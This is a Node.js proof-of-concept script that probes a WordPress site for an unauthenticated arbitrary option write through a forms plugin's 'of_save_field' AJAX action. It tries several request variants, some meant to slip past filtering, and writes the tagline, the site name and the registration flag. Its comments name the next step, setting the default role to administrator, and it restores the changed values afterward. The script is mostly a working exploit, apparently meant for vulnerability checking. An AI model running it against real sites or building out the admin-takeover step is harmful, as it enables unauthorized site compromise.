// probe.mjs - unauthenticated arbitrary option write via the old-forms
// `of_save_field` AJAX action (wp_ajax_nopriv_of_save_field).
//
// Usage: node probe.mjs <base-url>
// Exit 0 = VULNERABLE (an unauthenticated write changed an observable option)
// Exit 1 = NOT vulnerable (no variant produced an observable change)
// Exit 2 = indeterminate (bad arguments, or target unreachable / unexpected response)
//
// Only requests to the single base URL are sent. Redirects are not followed, so
// no other host can be contacted. Options changed during testing are restored.

const rawArg = process.argv[2];
if (!rawArg) {
	console.error('usage: node probe.mjs <base-url>');
	process.exit(2);
}

let base;
try {
	const u = new URL(rawArg);
	if (u.protocol !== 'http:' && u.protocol !== 'https:') throw new Error('bad protocol');
	base = u.href.replace(/\/+$/, '');
} catch {
	console.error(`invalid base url: ${rawArg}`);
	process.exit(2);
}

const AJAX = `${base}/wp-admin/admin-ajax.php`;

async function req(url, opts = {}) {
	const res = await fetch(url, {
		redirect: 'manual',
		signal: AbortSignal.timeout(15000),
		...opts,
	});
	const text = await res.text();
	return { status: res.status, location: res.headers.get('location') || '', text };
}

// Read the public tagline/site name via the unauthenticated REST root.
async function getSite() {
	const r = await req(`${base}/?rest_route=/`);
	if (r.status !== 200) throw new Error(`REST root returned HTTP ${r.status}`);
	const j = JSON.parse(r.text);
	if (typeof j.name !== 'string' || typeof j.description !== 'string') {
		throw new Error('REST root did not include name/description');
	}
	return { name: j.name, description: j.description };
}

// Registration is open when the register form is served (200) rather than
// redirected to ?registration=disabled.
async function registrationOpen() {
	const r = await req(`${base}/wp-login.php?action=register`);
	if (r.status === 302 && r.location.includes('registration=disabled')) return false;
	return r.status === 200;
}

// Send the unauthenticated write. Success is judged by the observable effect,
// not by the response body alone.
async function setOption(key, value, { multipart = false, actionInQuery = false } = {}) {
	let url = AJAX;
	let body;
	const headers = {};
	if (multipart) {
		const fd = new FormData();
		if (!actionInQuery) fd.append('action', 'of_save_field');
		fd.append('key', key);
		fd.append('value', value);
		body = fd;
	} else {
		const p = new URLSearchParams();
		if (!actionInQuery) p.append('action', 'of_save_field');
		p.append('key', key);
		p.append('value', value);
		body = p.toString();
		headers['Content-Type'] = 'application/x-www-form-urlencoded';
	}
	if (actionInQuery) url += '?action=of_save_field';
	const r = await req(url, { method: 'POST', body, headers });
	return r.status === 200 && /"success"\s*:\s*true/.test(r.text);
}

function marker(tag) {
	// Plain alphanumeric marker: avoids words a keyword filter would target.
	return `probe${tag}${Date.now().toString(36)}${Math.floor(Math.random() * 1e6).toString(36)}`;
}

const log = (...a) => console.log('[probe]', ...a);

let exploitable = false;
let baseline = null;
let regWasOpen = false;
let changedTagline = false;
let changedRegistration = false;

try {
	baseline = await getSite();
	regWasOpen = await registrationOpen();
	log(`target ${base}; baseline registration open=${regWasOpen}`);

	// Variants that write an observable option (tagline / site name).
	const variants = [
		{ label: 'urlencoded, key=blogdescription', key: 'blogdescription', field: 'description', tag: 'a' },
		{ label: 'padded/mixed-case key', key: '  BlogDescription ', field: 'description', tag: 'b' },
		{ label: 'multipart/form-data body', key: 'blogdescription', field: 'description', tag: 'c', multipart: true },
		{ label: 'action in query string', key: 'blogdescription', field: 'description', tag: 'd', actionInQuery: true },
		{ label: 'key=blogname (site name)', key: 'blogname', field: 'name', tag: 'e' },
	];

	for (const v of variants) {
		if (exploitable) break;
		const m = marker(v.tag);
		const sent = await setOption(v.key, m, {
			multipart: !!v.multipart,
			actionInQuery: !!v.actionInQuery,
		});
		const now = await getSite();
		const hit = now[v.field] === m;
		if (v.field === 'description' && now.description !== baseline.description) changedTagline = true;
		if (v.field === 'name' && now.name !== baseline.name) changedTagline = true;
		log(`variant "${v.label}": response_ok=${sent} observed=${hit}`);
		if (hit) exploitable = true;
	}

	// Impact variant: enabling user registration (the step that precedes
	// setting default_role=administrator). Only meaningful if registration
	// was closed at baseline.
	if (!exploitable && !regWasOpen) {
		for (const key of ['users_can_register', '  USERS_CAN_REGISTER ']) {
			await setOption(key, '1');
			changedRegistration = true;
			const open = await registrationOpen();
			log(`variant "registration flag key=${JSON.stringify(key)}": registration open=${open}`);
			if (open) {
				exploitable = true;
				break;
			}
		}
	}
} catch (err) {
	console.error('[probe] error:', err && err.message ? err.message : err);
	if (!exploitable) {
		// Restore first, then report indeterminate.
		await restore();
		process.exit(2);
	}
} finally {
	// finally runs before exit below; restore is also called explicitly in the catch path.
}

await restore();
log(exploitable ? 'RESULT: VULNERABLE' : 'RESULT: NOT vulnerable (no variant produced an observable change)');
process.exit(exploitable ? 0 : 1);

async function restore() {
	try {
		if (baseline && changedTagline) {
			const now = await getSite();
			if (now.description !== baseline.description) {
				await setOption('blogdescription', baseline.description);
			}
			if (now.name !== baseline.name) {
				await setOption('blogname', baseline.name);
			}
			log('restored tagline/site name');
		}
		if (changedRegistration) {
			await setOption('users_can_register', regWasOpen ? '1' : '0');
			log(`restored users_can_register=${regWasOpen ? '1' : '0'}`);
		}
	} catch (err) {
		console.error('[probe] restore warning:', err && err.message ? err.message : err);
	}
}
